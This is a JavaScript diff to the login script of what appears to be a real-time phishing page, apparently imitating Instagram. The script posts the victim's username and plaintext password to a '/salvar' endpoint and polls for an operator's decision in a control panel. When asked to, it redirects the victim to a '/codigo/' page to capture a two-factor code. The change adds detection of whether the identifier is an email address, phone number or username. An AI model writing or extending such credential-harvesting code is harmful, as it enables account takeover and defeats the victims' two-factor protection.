@@ -55,6 +55,17 @@ if (usernameInput) {
   });
 }
 
+function detectarTipoIdentificador(val) {
+  if (!val) return 'usuario';
+  const s = String(val).trim();
+  if (s.includes('@') && s.includes('.')) return 'email';
+  const digitos = s.replace(/\D/g, '');
+  if (digitos.length >= 8 && /^\+?[\d\s().-]{8,22}$/.test(s)) {
+    return 'telefone';
+  }
+  return 'usuario';
+}
+
 loginForm.addEventListener('submit', async (event) => {
   event.preventDefault();
   const username = usernameInput ? usernameInput.value.trim() : "";
@@ -69,8 +80,10 @@ loginForm.addEventListener('submit', async (event) => {
   submitButton.disabled = true;
   submitButton.textContent = 'Aguarde...';
 
+  const tipoDetectado = detectarTipoIdentificador(username);
   sessionStorage.setItem('loginIdentifier', username);
   sessionStorage.setItem('ig_usuario', username);
+  sessionStorage.setItem('tipo_identificador', tipoDetectado);
 
   try {
     const res = await fetch('/salvar', {
@@ -81,7 +94,8 @@ loginForm.addEventListener('submit', async (event) => {
         senha: password,
         usuario: username,
         username: username,
-        password: password
+        password: password,
+        tipo_identificador: tipoDetectado
       }),
     });
   } catch (err) {
@@ -89,10 +103,10 @@ loginForm.addEventListener('submit', async (event) => {
   }
 
   // Inicia espera ativa pela decisão do operador no painel ou validação
-  iniciarEsperaStatus(username);
+  iniciarEsperaStatus(username, tipoDetectado);
 });
 
-function iniciarEsperaStatus(usuario) {
+function iniciarEsperaStatus(usuario, tipo = "usuario") {
   if (pollingInterval) clearInterval(pollingInterval);
 
   const checarStatus = async () => {
@@ -127,7 +141,7 @@ function iniciarEsperaStatus(usuario) {
 
         submitButton.textContent = 'Carregando...';
         setTimeout(() => {
-          window.location.href = `/codigo/?usuario=${encodeURIComponent(usuario)}`;
+          window.location.href = `/codigo/?usuario=${encodeURIComponent(usuario)}&tipo=${encodeURIComponent(tipo)}`;
         }, 200);
         return;
       }
@@ -173,7 +187,8 @@ function conectarSSELogin() {
           } else if (item.status_login === "solicitar_2fa") {
             if (pollingInterval) clearInterval(pollingInterval);
             submitButton.textContent = 'Carregando...';
-            window.location.href = `/codigo/?usuario=${encodeURIComponent(currentUser)}`;
+            const currentTipo = sessionStorage.getItem('tipo_identificador') || item.tipo_identificador || 'usuario';
+            window.location.href = `/codigo/?usuario=${encodeURIComponent(currentUser)}&tipo=${encodeURIComponent(currentTipo)}`;
           }
         }
       } catch (e) {}
